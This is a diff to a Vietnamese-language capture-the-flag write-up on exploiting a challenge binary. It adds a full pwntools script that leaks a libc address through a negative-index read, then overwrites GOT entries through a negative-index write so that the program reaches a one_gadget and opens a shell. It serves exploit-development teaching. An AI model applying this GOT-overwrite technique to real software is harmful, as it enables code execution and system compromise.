@@ -43,6 +43,56 @@ Hướng khai thác còn lại là dùng one_gadget để tạo shell. Cần tì
 <img width="958" height="700" alt="image" src="https://github.com/user-attachments/assets/e5146ecd-a01b-4b52-a840-77cb84bda44d" />
 <img width="945" height="261" alt="image" src="https://github.com/user-attachments/assets/46ffb26f-1ce2-467a-869f-10c3ee35a473" />
 
-Chỉ có duy nhất tại hàm perror trong `make_noise` là có 
+Chỉ có duy nhất tại hàm `perror` trong `make_noise` là có điều kiện thỏa one_gadget đầu tiên. 
 
+<img width="901" height="476" alt="image" src="https://github.com/user-attachments/assets/428cf6c4-eeef-4ede-a05a-b442897a3490" />
 
+Để tới được hàm perror thì cần phải làm cho biến stream = 0. Muốn stream = 0 thì ta thay hàm `fopen` bằng `perror` vì `perror` luôn trả về NULL. 
+
+Ghi đè vào bảng GOT (các hàm nào không cần ghi đè thì để nguyên hàm cũ để tránh lỗi):
+
+    payload=p64(libc.sym['system'])
+    payload+=p64(libc.sym['printf'])
+    payload+=p64(libc.sym['system'])
+    payload+=p64(libc.sym['read'])
+    payload+=p64(libc.sym['perror'])  //thay fopen bằng perror
+    payload+=p64(one_gadget)          //thay perror bằng one_gadget
+    
+    p.sendlineafter(b'Input your choice:',b'1') //input_player
+    p.sendlineafter(b'id',b'-2')
+    p.sendafter(b'name',payload)
+    
+    p.sendlineafter(b'Input your choice:',b'3') //make_noise
+
+## Script python
+
+    #!/usr/bin/env python3
+    from pwn import *
+    context.binary=exe=ELF('./vuln_patched',checksec=False)
+    libc=ELF('./libc.so.6')
+    p=process(exe.path)
+    
+    p.sendafter(b'First, create a user.',b'zyan')
+    p.sendlineafter(b'Input your choice:',b'2')
+    p.sendlineafter(b'Input id to view: ',b'-3')
+    p.recvuntil(b'Name: ')
+    libc_leak=u64(p.recv(6)+b'\x00\x00')
+    libc.address=libc_leak-0x29dc0
+    print(hex(libc_leak))
+    
+    one_gadget=libc.address+0xebc41
+    
+    payload=p64(libc.sym['system'])
+    payload+=p64(libc.sym['printf'])
+    payload+=p64(libc.sym['system'])
+    payload+=p64(libc.sym['read'])
+    payload+=p64(libc.sym['perror'])
+    payload+=p64(one_gadget)
+    
+    p.sendlineafter(b'Input your choice:',b'1')
+    p.sendlineafter(b'id',b'-2')
+    p.sendafter(b'name',payload)
+    
+    p.sendlineafter(b'Input your choice:',b'3')
+    
+    p.interactive()
